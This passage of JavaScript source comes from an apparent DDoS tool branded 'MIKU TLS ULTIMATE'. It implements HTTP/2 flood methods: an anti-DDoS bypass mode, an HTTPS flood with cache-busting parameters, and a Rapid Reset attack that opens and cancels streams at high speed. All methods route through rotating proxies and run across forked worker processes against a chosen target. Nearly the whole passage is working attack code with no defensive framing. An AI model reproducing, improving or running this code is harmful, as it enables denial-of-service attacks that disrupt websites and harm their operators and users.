                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true,
                keepAlive: true,
                keepAliveInitialDelay: 10000
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const burstSize = 1; // Anti-DDoS: 1 request at a time

                    for (let i = 0; i < burstSize; i++) {
                        const headers = buildH2Headers();
                        
                        // Anti-DDoS: add random delays and headers
                        headers['x-request-id'] = crypto.randomUUID();
                        headers['x-client-data'] = randstr(20);
                        
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests));
                    
                    // Anti-DDoS: slow rate with random delays
                    const delay = getRandomInt(500, 2000);
                    setTimeout(() => { main(); }, delay);
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            antiDDoSBypass(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ METHOD: HTTPS FLOOD ============
function httpsFlood() {
    if (proxy.length === 0) {
        setTimeout(httpsFlood, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        httpsFlood();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    const requests = [];
                    const burstSize = isFull ? 10 : 5; // HTTPS: high burst

                    for (let i = 0; i < burstSize; i++) {
                        const headers = buildH2Headers();
                        
                        // HTTPS flood: add random query params
                        headers[':path'] = headers[':path'] + (headers[':path'].includes('?') ? '&' : '?') + 
                            `_=${Date.now()}&${randstr(6)}=${randstr(8)}`;
                        
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }
                    tlsSocket.write(Buffer.concat(requests));
                    setTimeout(() => { main(); }, isFull ? 1 : 1000 / ratelimit);
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            httpsFlood(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ METHOD: RAPID RESET ============
function rapidReset() {
    if (proxy.length === 0) {
        setTimeout(rapidReset, 100);
        return;
    }
    
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        rapidReset();
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            const tlsOptions = {
                socket: netSocket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: TLS_CONFIG.ciphers,
                sigalgs: TLS_CONFIG.sigalgs,
                ecdhCurve: TLS_CONFIG.curves,
                secureOptions: TLS_CONFIG.secureOptions,
                secure: true,
                minVersion: TLS_CONFIG.minVersion,
                maxVersion: TLS_CONFIG.maxVersion,
                rejectUnauthorized: false,
                honorCipherOrder: true
            };
            
            tlsSocket = tls.connect(tlsOptions, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol !== 'h2') {
                    tlsSocket.destroy();
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_table],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_header],
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);
                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 4 && frame.flags === 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                                if (!statuses[status]) statuses[status] = 0;
                                statuses[status]++;
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.destroy();
                                return;
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function main() {
                    if (tlsSocket.destroyed) return;
                    
                    // Rapid Reset: Create streams and immediately reset them
                    const resetCount = isFull ? 100 : 50;
                    
                    for (let i = 0; i < resetCount; i++) {
                        const headers = buildH2Headers();
                        const headerList = Object.entries(headers);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(headerList)
                        ]);
                        
                        // Send HEADERS frame
                        tlsSocket.write(encodeFrame(streamId, 1, packed, 0x25));
                        
                        // Immediately send RST_STREAM to reset
                        tlsSocket.write(encodeRstStream(streamId, 3, 0));
                        
                        streamId += 2;
                    }
                    
                    // Rapid Reset: very fast cycle
                    setTimeout(() => { main(); }, isFull ? 1 : 5);
                }
                main();
            }).on('error', () => {
                if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket && !tlsSocket.destroyed) { 
            tlsSocket.destroy(); 
            rapidReset(); 
        }
    });

    netSocket.on('error', (error) => {
        if (netSocket) netSocket.destroy();
        if (tlsSocket && !tlsSocket.destroyed) tlsSocket.destroy();
    });
}

// ============ TCP OPTIMIZATION ============
function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr'];
    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl}`;
    exec(command, () => {});
}

setInterval(() => { timer++; }, 1000);
setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

// ============ CLUSTER SETUP ============
if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: Math.min(threads, os.cpus().length * 2) }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    
    // Determine active method
    let activeMethod = 'TLS';
    if (enableUAM) activeMethod = 'UAM';
    else if (enableCF) activeMethod = 'CF';
    else if (enableAntiDDoS) activeMethod = 'ANTI-DDOS';
    else if (enableHTTPS) activeMethod = 'HTTPS';
    else if (enableRapid) activeMethod = 'RAPID RESET';
    
    console.log(`✅ MIKU TLS ULTIMATE v15.0 - Advanced Methods`);
    console.log(`   Target: ${target}`);
    console.log(`   Time: ${time}s | Threads: ${threads} | Rate: ${ratelimit} req/s`);
    console.log(`   Method: ${activeMethod}`);
    console.log(`   Full Mode: ${isFull ? 'ON' : 'OFF'}`);

    cluster.on('exit', (worker) => { cluster.fork({ core: worker.id % os.cpus().length }); });
    cluster.on('message', (worker, message) => { workers[worker.id] = [worker, message]; });
    
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w][0].state === 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null) statuses[code] = 0;
                            statuses[code] += st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(new Date().toLocaleString('us'), statuses);
        }, 1000);
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);
} else {
    let consssas = 0;
    let someee = setInterval(() => {
        if (consssas < 30000) {
            consssas++;
        } else {
            clearInterval(someee);
            return;
        }
        
        // Select method based on flag
        if (enableUAM) {
            uamBypass();
        } else if (enableCF) {
            cfBypass();
        } else if (enableAntiDDoS) {
            antiDDoSBypass();
        } else if (enableHTTPS) {
            httpsFlood();
        } else if (enableRapid) {
            rapidReset();
        } else {
            tlsBypass(); // Default: TLS bypass
        }
    }, delay);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }
    setTimeout(() => process.exit(1), time * 1000);
}
